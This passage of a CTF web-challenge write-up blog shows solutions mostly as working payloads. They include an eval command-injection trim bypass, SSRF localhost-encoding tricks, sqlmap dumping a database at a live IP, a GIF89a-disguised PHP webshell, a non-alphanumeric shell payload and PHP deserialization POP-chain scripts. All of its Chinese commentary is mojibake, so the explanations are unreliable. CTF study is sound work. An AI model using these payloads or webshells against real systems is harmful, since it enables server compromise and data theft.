class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>numä¸ç­‰äº36ï¼Œå»ç©ºåä¸ç­‰äº36ï¼Œç»è¿‡è¿‡æ»¤åç­‰äº36<br>ä¸»è¦å°±æ˜¯ç»•è¿‡trim<br>trim<img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132926394.png">è¿‡æ»¤äº† 0a 09 0b æ²¡æœ‰è¿‡æ»¤0cï¼ˆæ¢é¡µé”®ï¼‰å¯ä»¥è¯•è¯•</p><p><strong>?str&#x3D;\\&#x2F;Ilikeisctf&amp;num&#x3D;%0c36&amp;cmd&#x3D;system(â€˜ls &#x2F;â€˜);</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132956650.png"><br><strong>?str&#x3D;\\&#x2F;Ilikeisctf&amp;num&#x3D;%0c36&amp;cmd&#x3D;system(â€˜tac &#x2F;flagâ€™);</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133021722.png"></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133049530.png"></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133133867.png"><br>IPåœ°å€ä¼ªé€ ï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œ**?urls&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a>   **<br>è¿™ä¸ªä¸è¡Œï¼Œä¸èƒ½ç»•è¿‡ï¼Œè¯•ä¸€ä¸‹?urls&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><blockquote><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a> åå…­è¿›åˆ¶<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a> å…«è¿›åˆ¶ è¿˜æœ‰ä¸€ä¸ªç–‘æƒ‘å°±æ˜¯äºŒè¿›åˆ¶åº”è¯¥ä¹Ÿå¯ä»¥ ä½†æ˜¯è¯¥æ€ä¹ˆåŒºåˆ†è¿›åˆ¶å‘¢ï¼Ÿ<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a> 10 è¿›åˆ¶æ•´æ•°æ ¼å¼ (ï¼Ÿï¼Ÿ)è¿™ä»€ä¹ˆæ“ä½œ<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> 16 è¿›åˆ¶æ•´æ•°æ ¼å¼</p><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a><br>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0000000000000.001/flag.php</a></p><p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p><p>url&#x3D;<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a> CIDR</p><p>ä»¥ä¸‹ä¸ºå¸¸ç”¨ç»•è¿‡æ–¹å¼ ä½†æœ¬é¢˜ä¸è¡Œçš„è§£æ³•</p><p>çŸ­æ ‡ç­¾ç»•è¿‡<br>ipv6ç»•è¿‡[::1]<br>url&#x3D;<a href="http://0.0.0.127/">http://127</a>ã€‚0ã€‚0ã€‚1&#x2F;flag.php å¥å·<br><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">å‚è€ƒåšå®¢</a></p></blockquote><h2 id="eazy-onlineshell"><a href="#eazy-onlineshell" class="headerlink" title="eazy-onlineshell"></a>eazy-onlineshell</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133204338.png"><br>æ ¹æ®æç¤ºå…ˆä¼ ä¸ªrce<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133235116.png"><br>å†æŸ¥çœ‹å¤‡ä»½æ–‡ä»¶  </p><p> <img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133314873.png"><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133354250.png"><br>æŸ¥çœ‹æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/www.zip&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_SourceCode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:   //è®¿é—®www.<span class="built_in">zip</span>ä¼šæ‰“å¼€app.py</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">action_rce</span>():</span><br><span class="line">        <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            action = flask.request.form[<span class="string">&quot;act&quot;</span>]   //åœ¨postä¼ å…¥actï¼Œå†™å…¥å‘½ä»¤</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(action[<span class="number">1</span>:-<span class="number">1</span>])    //åˆ‡ç‰‡ï¼Œæˆªå–ç¬¬äºŒä¸ªå’Œå€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦ä¹‹é—´çš„</span><br><span class="line">                res = subprocess.run([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">                <span class="comment"># print(res)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠæ–‡ä»¶å†™å…¥app.pyä¸­ï¼Œæ‰¾ä¸åˆ°å…¶ä»–å¯ä»¥åˆ©ç”¨çš„ç›®å½•æ–‡ä»¶<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133428124.png"></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133505218.png"></p><p>æŠŠlså†™å…¥app.py   æ— å›æ˜¾ï¼Œæ‰€ä»¥è¦è®¿é—®<a href="http://www.zipæ‰§è¡Œapp.py/">www.zipæ‰§è¡Œapp.py</a><br><strong>act&#x3D;â€™ls &gt;app.pyâ€™</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133533009.png"></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133557738.png"></p><p>è®¿é—®flag       act&#x3D;â€™tac flag&gt;app.pyâ€™<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133633611.png"></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133721044.png"></p><h2 id="å‚»æŸ±"><a href="#å‚»æŸ±" class="headerlink" title="å‚»æŸ±"></a>å‚»æŸ±</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133752018.png"></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133814009.png"><br>çŒœæµ‹æ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯ä¸çŸ¥é“æ³¨å…¥ç±»å‹ï¼Œç™»å…¥loginé¡µé¢çœ‹ä¸€ä¸‹<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133853474.png"><br>æ²¡å‘ç°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿<br>burp suiteæ‰«ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨User - Agentæ³¨å…¥ï¼Œï¼ˆéœ€è¦ç­‰ä¸€ä¼šï¼Œä¸€å¼€å§‹ä¼šæ£€æµ‹ä¸å‡ºæ¥ï¼‰<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133925568.png"><br>sqlmapä¸€æŠŠæ¢­<br>é’ˆå¯¹User - Agentçš„å€¼æ¢æµ‹SQLæ³¨å…¥ï¼Œéœ€è¦è®¾ç½® â€“levelå€¼ä¸º3<br><strong>sqlmap -u <strong><a href="http://120.79.18.34:20177///login.php">http://120.79.18.34:20177///login.php</a></strong> â€“level 3 â€“dbs</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108133956450.png"><br><strong>sqlmap -u <strong><a href="http://120.79.18.34:20177///login.php"><strong>http://120.79.18.34:20177///login.php</strong></a></strong> â€“level 3 -D ctf â€“tables</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134018177.png"><br><strong>sqlmap -u <strong><a href="http://120.79.18.34:20177///login.php"><strong>http://120.79.18.34:20177///login.php</strong></a></strong> â€“level 3 -D ctf -T user_agents â€“columns â€“dump</strong></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221115110135102.png"></p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134103418.png"><br>å­˜åœ¨<a href="http://www.raræ–‡ä»¶/">www.raræ–‡ä»¶</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134142570.png"></p><p>GIF89a<br><?php eval($_REQUEST['cmd']);?><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134223323.png"></p><h2 id="rceï¼Ÿ"><a href="#rceï¼Ÿ" class="headerlink" title="rceï¼Ÿ"></a>rceï¼Ÿ</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134247377.png"></p><ul><li>ç”¨postæŠŠshellä¼ ä¸ŠæœåŠ¡å™¨ï¼Œåœ¨shellé‡Œé¢å†™å¥½æˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç </li><li>.æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç”¨. fileæ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œå®ƒ</li></ul><p>æˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯&#x2F;tmp&#x2F;phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">ç¥</a><br><a href="https://blog.csdn.net/m0_51078229/article/details/114366053"></a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://120.79.18.34:20176/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134412546.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?shell=?&gt;&lt;?=`.+/%3F%3F%3F/%3F%3F%3F%3F%3F%3F%3F%3F[%40-[]`%3B?&gt;</span><br></pre></td></tr></table></figure><h2 id="çŒ«å’Œè€é¼ "><a href="#çŒ«å’Œè€é¼ " class="headerlink" title="çŒ«å’Œè€é¼ "></a>çŒ«å’Œè€é¼ </h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134436377.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//flag is in flag.php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  //åœ¨éœ€è¦å­—ç¬¦ä¸²å€¼çš„åœ°æ–¹ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒè¿›è¡Œå¯¹è±¡çš„ç±»å‹è½¬æ¢</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;  <span class="comment">//cå½±å“bï¼ŒåŒæ—¶ä¼šå½±å“a</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);     <span class="comment">//ç›¸å½“äºecho,å’Œtostringä¸€èµ·åˆ©ç”¨</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]);   <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = &amp;<span class="variable language_">$this</span>-&gt;b;  <span class="comment">//&amp;å¼•ç”¨</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();   <span class="comment">//c-&gt;b-&gt;a   ï¼Œè°ƒç”¨includeå‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">cat</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134539841.png"><br><strong>?cat&#x3D;O:3:â€catâ€:3:{s:1:â€aâ€;s:3:â€xxxâ€;s:1:â€bâ€;R:2;s:1:â€câ€;O:5:â€mouseâ€:1:{s:1:â€vâ€;s:52:â€php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpâ€;}}</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134605497.png"><br>base64è§£ç </p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134626881.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134652521.png"><br>è¿™ä¸ªæ˜¯pharååºåˆ—åŒ–çš„è§¦å‘å‡½æ•°<br>æ„é€ payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span 